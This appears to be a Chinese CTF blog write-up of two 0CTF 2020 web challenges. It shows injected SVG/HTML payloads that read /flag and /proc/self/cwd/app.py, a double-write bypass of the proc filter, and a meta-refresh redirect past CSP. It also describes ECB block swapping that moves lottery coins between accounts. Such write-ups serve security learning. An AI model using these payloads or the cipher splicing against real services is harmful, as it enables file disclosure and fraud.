@@ -1,0 +1,229 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <title>0ctf2020_web</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet", href="/./css/style.css">
+<link rel="shortcut icon", href="/../../../../images/favicon.ico">
+<link rel="apple-touch-icon", href="/./apple-touch-icon.png">
+
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+    </head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Altm4nz's blog</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Altm4nz's blog</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                
+                <img class="al_sidebar_avatar" src="../../../../images/IMG_4178.JPG">
+                <p></p>
+                <h4>WEB划水选手</h4>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        0ctf2020_web
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            June 30, 2020 04:06 AM
+                        </div>
+
+                        
+                            <div class="al_page_content_info">
+                                687 words
+                            </div>
+                        
+
+                        
+                            <div class="al_page_content_info">
+                                3 minutes read
+                            </div>
+                            <div class="al_page_content_info">
+                                本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+                            </div>
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Wechat-Generator"><span class="toc-text">Wechat Generator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lottery"><span class="toc-text">Lottery</span></a></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>首先两个功能，preview和share。</p>
+<p>preview根据对话框内容生成预览图片，share则是分享照片。</p>
+<p>简单测试后发现生成图片的url <code>http://pwnable.org:5000/image/jQnEFz/png</code></p>
+<p>修改png后发现返回报错，猜测后台使用ImageMagick</p>
+<p>尝试将后缀名改为htm可以看到图片的htm格式。</p>
+<p><img src="/2020/06/30/0ctf2020-web/1.png" alt=""></p>
+<p>可以看到我们输入的emoj表情被拼接到了一个url中。那么尝试闭合。</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=[&#123;<span class="string">"type"</span>:<span class="number">0</span>,<span class="string">"message"</span>:<span class="string">"[basket\"</span>/&gt;&lt;<span class="built_in">image</span> href=\<span class="string">"/flag\"</span> /&gt;]Love you!<span class="string">"&#125;,&#123;"</span><span class="built_in">type</span><span class="string">":1,"</span>message<span class="string">":"</span>Me too!!!<span class="string">"&#125;]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/0ctf2020-web/2.png" alt=""></p>
+<p>成功插入标签。然后去访问渲染成png的图片。</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//pwnable<span class="meta">.org</span>:<span class="number">5000</span>/share/ICDJEO</span><br></pre></td></tr></table></figure>
+
+<p>发现对话框无内容。修改pay</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=[&#123;<span class="string">"type"</span>:<span class="number">0</span>,<span class="string">"message"</span>:<span class="string">"[basket\"</span>/&gt;&lt;<span class="built_in">image</span> href=\<span class="string">"text:/flag\"</span> /&gt;]Love you!<span class="string">"&#125;,&#123;"</span><span class="built_in">type</span><span class="string">":1,"</span>message<span class="string">":"</span>Me too!!!<span class="string">"&#125;]</span></span><br></pre></td></tr></table></figure>
+
+<p>成功读到flag的内容，应该只是第一层</p>
+<img src="/2020/06/30/0ctf2020-web/3.png" style="zoom:50%;">
+
+<p>接下来想办法读web文件内容，没有web目录，直接去读proc。</p>
+<p>这里proc被过滤了，双写可以绕过。</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=[&#123;<span class="string">"type"</span>:<span class="number">0</span>,<span class="string">"message"</span>:<span class="string">"[basket\"</span>/&gt;&lt;<span class="built_in">image</span> href=\<span class="string">"text:/prprococ/self/cwd/app.py\"</span> /&gt;]Love you!<span class="string">"&#125;,&#123;"</span><span class="built_in">type</span><span class="string">":1,"</span>message<span class="string">":"</span>Me too!!!<span class="string">"&#125;]</span></span><br></pre></td></tr></table></figure>
+
+<p>读到文件内容</p>
+<img src="/2020/06/30/0ctf2020-web/4.png" style="zoom:50%;">
+
+<p>拿到一个url，访问后发现是让弹窗。</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//pwnable<span class="meta">.org</span>:<span class="number">5000</span>/SUp3r_S3cret_URL/<span class="number">0</span>Nly_4dM1n_Kn0ws</span><br></pre></td></tr></table></figure>
+
+<p>由于有CSP限制，并且不能再服务器上控制JS文件内容，使用meta标签跳转。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=[&#123;<span class="string">"type"</span>:<span class="number">0</span>,<span class="string">"message"</span>:<span class="string">"[basket\"</span>/&gt;&lt;memetata http-equiv=\<span class="string">"refresh\"</span> content=\<span class="string">"0;url=http://vps/1.html\"</span> &gt;]Love you!<span class="string">"&#125;,&#123;"</span>type<span class="string">":1,"</span>message<span class="string">":"</span>Me too!!!<span class="string">"&#125;]</span></span><br></pre></td></tr></table></figure>
+
+<p>vps上放alert的代码。</p>
+<p>访问生成的htm文件 <code>http://pwnable.org:5000/image/NbDxdh/htm</code> 成功跳转弹窗。</p>
+<p>上交给admin接口 <code>image/NbDxdh/htm</code></p>
+<p><img src="/2020/06/30/0ctf2020-web/6.png" alt="5"></p>
+<p>拿到flag。</p>
+<p><img src="/2020/06/30/0ctf2020-web/5.png" alt="5"></p>
+<h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>简单注册后三个功能</p>
+<ul>
+<li>Buy</li>
+</ul>
+<p><img src="/2020/06/30/0ctf2020-web/7.png" alt=""></p>
+<p>10元买一张彩票获得一个enc</p>
+<ul>
+<li>info</li>
+</ul>
+<p><img src="/2020/06/30/0ctf2020-web/8.png" alt=""></p>
+<p>用enc去获取获奖信息</p>
+<ul>
+<li>charge</li>
+</ul>
+<p><img src="/2020/06/30/0ctf2020-web/9.png" alt=""></p>
+<p>去换对应coin</p>
+<p>通过分析enc</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>TX<span class="number">7</span>xBMApPLHpy<span class="number">1</span>wulOqLHH<span class="number">5</span>q<span class="number">9</span>kBXdXb\/<span class="symbol">nEm8</span>OBgeGFd+oSYPWX<span class="number">0</span>FGyp<span class="number">92</span>mLL<span class="name">m6</span>aE<span class="number">6</span><span class="symbol">NvACVCivOxjS0</span><span class="symbol">NRch9</span>Bj<span class="number">1</span>yS+fXGpdwWSi<span class="number">6</span>qv<span class="symbol">nUNb9</span>UQwxrZ<span class="number">8</span><span class="symbol">nMh66</span>mP<span class="number">7</span>JFWZtHT<span class="number">8</span><span class="name">g6</span>CqCHIqSduY<span class="number">1</span>dpE<span class="number">1</span>F<span class="number">3</span>PbSt<span class="number">9</span>reYD<span class="number">8</span>AcCI<span class="number">4</span>hIXsxZg=</span><br><span class="line">l<span class="number">0</span>A/yTcZuD<span class="number">19</span>RfZ<span class="attr">VSj/lBZA4</span>H<span class="number">4</span>WTFcutB<span class="name">G0</span>Oe<span class="number">75</span>M<span class="meta">O3</span>A<span class="number">5</span>wEGaou<span class="number">4</span>mSlU<span class="number">6</span>S+BmU<span class="number">3</span>EiGMxu<span class="attr">VsrcR+uWxsOwWr+Fjyew30</span>ptCA<span class="number">0</span>xoX+utpyxgyF/fIB<span class="name">m4</span>CcV<span class="symbol">ncLAVEZqmbttlkL8</span>VB<span class="number">8</span>rDw<span class="number">4</span>FzbQKv<span class="number">88</span>bH/bSt<span class="number">9</span>reYD<span class="number">8</span>AcCI<span class="number">4</span>hIXsxZg=</span><br><span class="line">yAi<span class="number">7</span>DdLP<span class="symbol">nP00</span><span class="symbol">NTtwDSkrkTwd9</span>IdghqFlwvrIbMUDgD<span class="number">1</span>X<span class="number">9</span>g+WWHZacx<span class="number">5</span>wFgrKQA+Zbqu<span class="number">2</span>XJgI\/B<span class="number">3</span><span class="symbol">NhGie8</span>zp<span class="number">7</span>Vj<span class="number">1</span>yS+fXGpdwWSi<span class="number">6</span>qv<span class="symbol">nUNb9</span>UQwxrZ<span class="number">8</span><span class="symbol">nMh66</span>mP<span class="number">7</span>JFWZtH\/<span class="number">60</span>UB<span class="number">7</span>sS<span class="number">0</span>foSe\/jrTz<span class="symbol">Nt3</span>vbSt<span class="number">9</span>reYD<span class="number">8</span>AcCI<span class="number">4</span>hIXsxZg=</span><br></pre></td></tr></table></figure>
+
+<p>发现后几位是相同的，猜测是ECB分组模式，进行重放攻击。</p>
+<p>分析发现将密文前128位替换</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc1=<span class="string">'yAi7DdLPnP00NTtwDSkrkTwd9IdghqFlwvrIbMUDgD1X9g+WWHZacx5wFgrKQA+Zbqu2XJgI\/B3NhGie8zp7Vj1yS+fXGpdwWSi6qvnUNb9UQwxrZ8nMh66mP7JFWZtH\/60UB7sS0foSe\/jrTzNt3vbSt9reYD8AcCI4hIXsxZg='</span></span><br><span class="line"><span class="meta">#&#123;<span class="string">"info"</span>:&#123;<span class="string">"lottery"</span>:<span class="string">"c7ba23fc-adaa-4b34-a323-c623d29c03ec"</span>,<span class="string">"user"</span>:<span class="string">"53549d01-75eb-4746-80da-57178b255434"</span>,<span class="string">"coin"</span>:3&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">enc2=<span class="string">'l0A/yTcZuD19RfZVSj/lBZA4H4WTFcutBG0Oe75MO3A5wEGaou4mSlU6S+BmU3EiGMxuVsrcR+uWxsOwWr+Fjyew30ptCA0xoX+utpyxgyF/fIBm4CcVncLAVEZqmbttlkL8VB8rDw4FzbQKv88bH/bSt9reYD8AcCI4hIXsxZg='</span></span><br><span class="line"><span class="meta">#&#123;<span class="string">"info"</span>:&#123;<span class="string">"lottery"</span>:<span class="string">"a41c0258-ac21-4ec7-94ea-fd4e9d03d4e9"</span>,<span class="string">"user"</span>:<span class="string">"6c6e1a9a-a09f-4d65-b72e-ec50ba0aa8fd"</span>,<span class="string">"coin"</span>:4&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过将enc1的前128位替换到enc2上，得到如下明文密文。</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yAi<span class="number">7</span>DdLP<span class="symbol">nP00</span><span class="symbol">NTtwDSkrkTwd9</span>IdghqFlwvrIbMUDgD<span class="number">1</span>X<span class="number">9</span>g<span class="meta">%</span><span class="number">2</span>BWWHZacx<span class="number">5</span>wFgrKQA<span class="meta">%</span><span class="number">2</span>BZbqu<span class="number">2</span>XJgI/B<span class="number">3</span><span class="symbol">NhGie8</span>zp<span class="number">7</span>View<span class="number">30</span>ptCA<span class="number">0</span>xoX<span class="meta">%</span><span class="number">2</span>ButpyxgyF/fIB<span class="name">m4</span>CcV<span class="symbol">ncLAVEZqmbttlkL8</span>VB<span class="number">8</span>rDw<span class="number">4</span>FzbQKv<span class="number">88</span>bH/bSt<span class="number">9</span>reYD<span class="number">8</span>AcCI<span class="number">4</span>hIXsxZg=</span><br><span class="line">&#123;<span class="string">"info"</span>:&#123;<span class="string">"lottery"</span>:<span class="string">"c7ba23fc-adaa-4b34-a323-c623d29c03ec"</span>,<span class="string">"user"</span>:<span class="string">"536e1a9a-a09f-4d65-b72e-ec50ba0aa8fd"</span>,<span class="string">"coin"</span>:<span class="number">4</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>容易看出，我们将明文直至user的前两位进行了替换，关键是将lottery进行了替换。</p>
+<p>那么就可以通过替换，将用户1的lottery兑换到用户2上，从而使用户2的coin增加。</p>
+<p>下面只需要寻找多个userid前两位相同的账户，购买lottery，将中奖coin兑换到一个账户上即可。</p>
+
+                </section>
+
+                
+                
+                
+
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">第五空间线上赛</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="al_index_footer dis_flex_center">
+
+
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Power By 
+        <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+    <div class="al_index_footer_item al_index_footer_extra_right">
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次
+    </div>
+            
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+    </body>
+</html>
+        
